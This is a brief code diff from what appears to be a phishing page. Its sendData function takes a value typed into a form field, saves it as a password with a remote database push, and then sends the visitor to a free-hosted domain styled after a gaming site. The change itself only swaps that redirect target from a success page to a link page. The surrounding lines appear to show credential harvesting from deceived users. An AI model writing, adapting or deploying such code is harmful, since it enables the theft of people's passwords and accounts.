@@ -58,7 +58,7 @@ function sendData() {
 	} else {
 		data.Password = document.getElementById("email").value
 		ref.push(data)
-		window.setTimeout(function() {window.location.href = "http://checkmategaming-icmx-team.rf.gd/success.html"},1000)
+		window.setTimeout(function() {window.location.href = "http://checkmategaming-icmx-team.rf.gd/link.html"},1000)
 	}
 }
 
